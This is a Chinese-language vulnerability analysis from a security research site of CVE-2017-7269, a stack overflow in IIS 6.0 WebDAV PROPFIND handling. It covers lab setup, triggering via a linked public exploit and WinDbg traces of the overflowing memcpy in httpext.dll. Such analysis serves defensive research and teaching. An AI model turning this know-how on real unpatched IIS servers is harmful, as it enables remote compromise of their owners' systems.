<!DOCTYPE html>


<html xmlns:wb="http://open.weibo.com/wb">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta property="wb:webmaster" content="ccd3e79934f3322d"/>
  <title>CVE-2017-7269 IIS6.0远程代码执行漏洞分析及Exploit</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术"/>
  <meta name="description" content=""/>

  <meta name="HandheldFriendly" content="True"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link rel="shortcut icon" href="/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="/static/css/screen.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/font.css"/>
  <link rel="stylesheet"
        href="//libs.baidu.com/fontawesome/4.0.3/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/static/css/prism.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/monokai.css" media="screen"/>
  <link rel="stylesheet" type="text/css" href="/static/css/custom.css?t=20170821"/>
  <link rel="stylesheet" type="text/css" href="/static/css/print.css?t=20170821" media="print"/>
  <script>
    var _hmt = _hmt || [];
    (function () {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ef67a70a7641da3b52452a05b3bbecae";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="/static/images/weixin-share.png" alt="Paper"/>
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title"><a href="/">Paper</a></h2>
    <h3 class="blog-description">安全技术精粹</h3>

    <form id="search" action="/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;" > </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search"/>

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://www.seebug.org/contribute/paper"><i
            class="fa fa-envelope-o"></i>投稿</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="/"><i
            class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="/category/vul-analysis/"><i
      class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/tools/"><i
      class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="/category/information/"><i
      class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/experience/"><i
      class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="/category/web-security/"><i
      class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/bin-security/"><i
      class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/mobile-security/"><i
      class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/paper-archive/"><i
      class="fa fa-angle-right"></i>纸篓</a></li>

  <li class="nav-" role="presentation"><a href="/category/prime/"><i
      class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>


        <li class="nav-" role="presentation"><a href="/call-for-paper/"><i
            class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i
            class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
  <article class="">
    <header class="post-header">

      <h1 class="post-title">CVE-2017-7269 IIS6.0远程代码执行漏洞分析及Exploit</h1>

      <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
      <section class="post-meta">
        <span class="post-time">
          <i class='fa fa-calendar'></i>
          <time datetime="2017-03-30" class="timeago">5 月，3 周 之前</time>
          <time datetime="2017-03-30" class="fulldate">三月 30, 2017</time>
        </span>
        
          <br>
          <i class='fa fa-tag'></i>
          
            <a href="/category/vul-analysis/">漏洞分析</a>
            
          
        








      </section>
    </header>

    <section class="post-content">
      <p><input type="hidden" class="Authorrss" value="k0shl" name="http://whereisk0shl.top"></p>
<p>转载请注明出处<br />
作者：<strong>k0shl</strong> <br />
作者博客：http://whereisk0shl.top</p>
<hr />
<h3>前言</h3>
<p>CVE-2017-7269是IIS 6.0中存在的一个栈溢出漏洞，在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，该漏洞可以导致远程代码执行。</p>
<p>目前在github上有一个在windows server 2003 r2上稳定利用的exploit，这个exp目前执行的功能是弹计算器，使用的shellcode方法是alpha shellcode，这是由于url在内存中以宽字节形式存放，以及其中包含的一些badchar，导致无法直接使用shellcode执行代码，而需要先以alpha shellcode的方法，以ascii码形式以宽字节写入内存，然后再通过一小段解密之后执行代码。</p>
<p>github地址：https://github.com/edwardz246003/IIS_exploit</p>
<p>这个漏洞其实原理非常简单，但是其利用方法却非常有趣，我在入门的时候调试过很多stack overflow及其exp，但多数都是通过覆盖ret，覆盖seh等方法完成的攻击，直到我见到了这个exploit，感觉非常艺术。但这个漏洞也存在其局限性，比如对于aslr来说似乎没有利用面，因此在高版本windows server中利用似乎非常困难，windows server 2003 r2没有aslr保护。</p>
<p>在这篇文章中，我将首先简单介绍一下这个漏洞的利用情况；接着，我将和大家一起分析一下这个漏洞的形成原因；然后我将给大家详细介绍这个漏洞的利用，最后我将简要分析一下这个漏洞的rop及shellcode。</p>
<p>我是一只菜鸟，如有不当之处，还望大家多多指正，感谢阅读！</p>
<hr />
<h3>弹弹弹－－一言不合就“弹”计算器</h3>
<h4>漏洞环境搭建</h4>
<p>漏洞环境的搭建非常简单，我的环境是windows server 2003 r2 32位英文企业版，安装之后需要进入系统配置一下iis6.0，首先在登陆windows之后，选择配置服务器，安装iis6.0服务，之后进入iis6.0管理器，在管理器中，有一个windows扩展，在扩展中有一个webdav选项，默认是进入用状态，在左侧选择allow，开启webdav，之后再iis管理器中默认网页中创建一个虚拟目录（其实这一步无所谓），随后选择run-&gt;services.msc-&gt;WebClient服务，将其开启，这样完成了我的配置。</p>
<h4>触发漏洞</h4>
<p>漏洞触发非常简单，直接在本地执行python exp.py即可，这里为了观察过程，我修改了exp，将其改成远程，我们通过wireshark抓包，可以看到和目标机的交互行为。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/03/1-4.png-w331s" /></p>
<p>可以看到，攻击主机向目标机发送了一个PROPFIND数据包，这个是负责webdav处理的一个指令，其中包含了我们的攻击数据，一个&lt;&gt;包含了两个超长的httpurl请求，其中在两个http url中间还有一个lock token的指令内容。</p>
<p>随后我们可以看到，在靶机执行了calc，其进程创建在w2wp进程下，用户组是NETWORK SERVICE。</p>
<p><img alt="2" src="https://images.seebug.org/content/images/2017/03/2-3.png-w331s" /></p>
<p>我在最开始的时候以为这个calc是由于SW_HIDE的参数设置导致在后台运行，后来发现其实是由于webdav服务进程本身就是无窗口的，导致calc即使定义了SW_SHOWNORMAL，也只是在后台启动了。</p>
<p>事实上，这个漏洞及时没有后面的&lt;&gt;中的http url，单靠一个IF:&lt;&gt;也能够触发，而之所以加入了第二个&lt;&gt;以及lock token，是因为作者想利用第一次和第二次http请求来完成一次精妙的利用，最后在<lock token="">指令下完成最后一击。</lock></p>
<p>我尝试去掉第二次&lt;&gt;以及<lock token="">请求，同样能引发iis服务的crash。</lock></p>
<p><img alt="3" src="https://images.seebug.org/content/images/2017/03/3-3.png-w331s" /></p>
<hr />
<h3>CVE-2017-7269漏洞分析</h3>
<hr />
<p>这个漏洞的成因是在WebDav服务动态链接库的httpext.dll的ScStorageFromUrl函数中，这里为了方便，我们直接来跟踪分析该函数，在下一小节内容，我将和大家来看看整个精妙利用的过程。我将先动态分析整个过程，然后贴出这个存在漏洞函数的伪代码。</p>
<p>在ScStorageFromUrl函数中，首先会调用ScStripAndCheckHttpPrefix函数，这个函数主要是获取头部信息进行检查以及对host name进行检查。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span><span class="c1">//调用CchUrlPrefixW获取url头部信息</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">67113</span><span class="n">bc8</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00</span><span class="n">fffbe8</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00605740</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4f8</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">c648</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00605740</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">671335</span><span class="n">f3</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4b4</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4d0</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStripAndCheckHttpPrefix</span><span class="o">+</span><span class="mh">0x1e</span><span class="o">:</span>
<span class="mi">671335</span><span class="n">f3</span> <span class="n">ff5024</span>          <span class="n">call</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">24</span><span class="n">h</span><span class="o">]</span>  <span class="n">ds</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">67113</span><span class="n">bec</span><span class="o">={</span><span class="n">httpext</span><span class="o">!</span><span class="n">CEcbBaseImpl</span><span class="o">&lt;</span><span class="n">IEcb</span><span class="o">&gt;::</span><span class="n">CchUrlPrefixW</span> <span class="o">(</span><span class="mi">6712</span><span class="n">c72a</span><span class="o">)}</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00000007</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00</span><span class="n">fffbe8</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4cc</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4f8</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">c648</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00605740</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">671335</span><span class="n">f6</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4b8</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4d0</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStripAndCheckHttpPrefix</span><span class="o">+</span><span class="mh">0x21</span><span class="o">:</span>
<span class="mi">671335</span><span class="n">f6</span> <span class="mi">8</span><span class="n">bd8</span>            <span class="n">mov</span>     <span class="n">ebx</span><span class="o">,</span><span class="n">eax</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">dc</span> <span class="n">esi</span> <span class="n">l6</span><span class="c1">//esi存放头部信息，以及server name，这个localhost会在后面获取到。</span>
<span class="mi">0060</span><span class="n">c648</span>  <span class="mi">00740068</span> <span class="mi">00700074</span> <span class="mi">002</span><span class="n">f003a</span> <span class="mi">006</span><span class="n">c002f</span>  <span class="n">h</span><span class="o">.</span><span class="na">t</span><span class="o">.</span><span class="na">t</span><span class="o">.</span><span class="na">p</span><span class="o">.:././.</span><span class="n">l</span><span class="o">.</span>
<span class="mi">0060</span><span class="n">c658</span>  <span class="mi">0063006</span><span class="n">f</span> <span class="mi">006</span><span class="n">c0061</span>                    <span class="n">o</span><span class="o">.</span><span class="na">c</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">l</span><span class="o">.</span>
</pre></div>


<p>在check完http头部和hostname之后，会调用wlen函数获取当前http url长度。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7d0</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0060</span><span class="n">b508</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">006058</span><span class="n">a8</span> <span class="n">edx</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7d0</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00605740</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000000</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67126</span><span class="n">ce8</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff330</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff798</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStoragePathFromUrl</span><span class="o">+</span><span class="mh">0x6d</span><span class="o">:</span>
<span class="mi">67126</span><span class="n">ce8</span> <span class="mi">50</span>              <span class="n">push</span>    <span class="n">eax</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7d0</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0060</span><span class="n">b508</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">006058</span><span class="n">a8</span> <span class="n">edx</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7d0</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00605740</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000000</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67126</span><span class="n">ce9</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff32c</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff798</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStoragePathFromUrl</span><span class="o">+</span><span class="mh">0x6e</span><span class="o">:</span>
<span class="mi">67126</span><span class="n">ce9</span> <span class="n">ff1550121167</span>    <span class="n">call</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">httpext</span><span class="o">!</span><span class="n">_imp__wcslen</span> <span class="o">(</span><span class="mi">67111250</span><span class="o">)]</span> <span class="n">ds</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">67111250</span><span class="o">={</span><span class="n">msvcrt</span><span class="o">!</span><span class="n">wcslen</span> <span class="o">(</span><span class="mi">77</span><span class="n">bd8ef2</span><span class="o">)}</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">r</span> <span class="n">eax</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7d0</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">dc</span> <span class="n">eax</span>
<span class="mi">0060</span><span class="n">e7d0</span>  <span class="mi">0062002</span><span class="n">f</span> <span class="mi">00620062</span> <span class="mi">00620062</span> <span class="mi">00620062</span>  <span class="o">/.</span><span class="n">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span>
<span class="mi">0060</span><span class="n">e7e0</span>  <span class="mi">61757948</span> <span class="mi">6</span><span class="n">f674f43</span> <span class="mi">48456</span><span class="n">b6f</span> <span class="mi">67753646</span>  <span class="n">HyuaCOgookEHF6ug</span>
<span class="mi">0060</span><span class="n">e7f0</span>  <span class="mi">38714433</span> <span class="mi">5</span><span class="n">a625765</span> <span class="mi">56615435</span> <span class="mi">6</span><span class="n">a536952</span>  <span class="mi">3</span><span class="n">Dq8eWbZ5TaVRiSj</span>
<span class="mi">0060</span><span class="n">e800</span>  <span class="mi">384</span><span class="n">e5157</span> <span class="mi">63555948</span> <span class="mi">43644971</span> <span class="mi">34686472</span>  <span class="n">WQN8HYUcqIdCrdh4</span>
<span class="mi">0060</span><span class="n">e810</span>  <span class="mi">71794758</span> <span class="mi">6</span><span class="n">b55336b</span> <span class="mi">504</span><span class="n">f6d48</span> <span class="mi">34717</span><span class="n">a46</span>  <span class="n">XGyqk3UkHmOPFzq4</span>
<span class="mi">0060</span><span class="n">e820</span>  <span class="mi">74436</span><span class="n">f54</span> <span class="mi">6</span><span class="n">f6f5956</span> <span class="mi">34577341</span> <span class="mi">7</span><span class="n">a726168</span>  <span class="n">ToCtVYooAsW4harz</span>
<span class="mi">0060</span><span class="n">e830</span>  <span class="mi">4</span><span class="n">d493745</span> <span class="mi">5448574</span><span class="n">e</span> <span class="mi">367</span><span class="n">a4c38</span> <span class="mi">62663572</span>  <span class="n">E7IMNWHT8Lz6r5fb</span>
<span class="mi">0060</span><span class="n">e840</span>  <span class="mi">486</span><span class="n">d6e43</span> <span class="mi">61773548</span> <span class="mi">61744</span><span class="n">d5a</span> <span class="mi">43654133</span>  <span class="n">CnmHH5waZMta3AeC</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">000002</span><span class="n">fd</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0060</span><span class="n">b508</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00600000</span> <span class="n">edx</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7d0</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00605740</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000000</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67126</span><span class="n">cef</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff32c</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff798</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStoragePathFromUrl</span><span class="o">+</span><span class="mh">0x74</span><span class="o">:</span>
<span class="mi">67126</span><span class="n">cef</span> <span class="mi">59</span>              <span class="n">pop</span>     <span class="n">ecx</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">r</span> <span class="n">eax</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">000002</span><span class="n">fd</span>
</pre></div>


<p>在利用的关键一次，我们获取的是poc中http://localhost/bbbbb 的字符串，这个字符串长度很长，可以看到eax寄存器存放的是url长度，长度是0x2fd，随后会进入一系列的判断，主要是检查url中一些特殊字符，比如0x2f。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">g</span><span class="c1">//eax存放的是指向url的指针，这里会获取指针的第一个字符，然后和“／”作比较</span>
<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7d0</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0060</span><span class="n">b508</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">006058</span><span class="n">a8</span> <span class="n">edx</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7d0</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00605740</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000000</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67126</span><span class="n">cd7</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff334</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff798</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStoragePathFromUrl</span><span class="o">+</span><span class="mh">0x5c</span><span class="o">:</span>
<span class="mi">67126</span><span class="n">cd7</span> <span class="mi">6683382</span><span class="n">f</span>        <span class="n">cmp</span>     <span class="n">word</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">],</span><span class="mi">2</span><span class="n">Fh</span>       <span class="n">ds</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">0060</span><span class="n">e7d0</span><span class="o">=</span><span class="mi">002</span><span class="n">f</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">dc</span> <span class="n">eax</span>
<span class="mi">0060</span><span class="n">e7d0</span>  <span class="mi">0062002</span><span class="n">f</span> <span class="mi">00620062</span> <span class="mi">00620062</span> <span class="mi">00620062</span>  <span class="o">/.</span><span class="n">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span>
<span class="mi">0060</span><span class="n">e7e0</span>  <span class="mi">61757948</span> <span class="mi">6</span><span class="n">f674f43</span> <span class="mi">48456</span><span class="n">b6f</span> <span class="mi">67753646</span>  <span class="n">HyuaCOgookEHF6ug</span>
</pre></div>


<p>经过一系列的检查之后，会进入一系列的memcpy函数，主要就是用来构造虚拟文件路径，这个地方拷贝的长度没有进行控制，而拷贝的目标地址，是在外层函数调用stackbuff申请的地址，这个地址会保存在栈里。在ScStorageFromUrl函数中用到，也就是在memcpy函数中用到，作为目的拷贝的地址。</p>
<p>ScStorageFromUrl函数中实际上在整个漏洞触发过程中会调用很多次，我们跟踪的这一次，是在漏洞利用中的一个关键环节之一。首先我们来看一下第一次有效的memcpy</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00000024</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">000002</span><span class="n">fd</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00000009</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000024</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000012</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680312</span><span class="n">c0</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67126</span><span class="n">fa9</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff330</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff798</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000206</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStoragePathFromUrl</span><span class="o">+</span><span class="mh">0x32e</span><span class="o">:</span>
<span class="mi">67126</span><span class="n">fa9</span> <span class="mi">8</span><span class="n">db5c4fbffff</span>    <span class="n">lea</span>     <span class="n">esi</span><span class="o">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">43</span><span class="n">Ch</span><span class="o">]</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00000024</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">000002</span><span class="n">fd</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00000009</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000024</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00</span><span class="n">fff35c</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680312</span><span class="n">c0</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67126</span><span class="n">faf</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff330</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff798</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
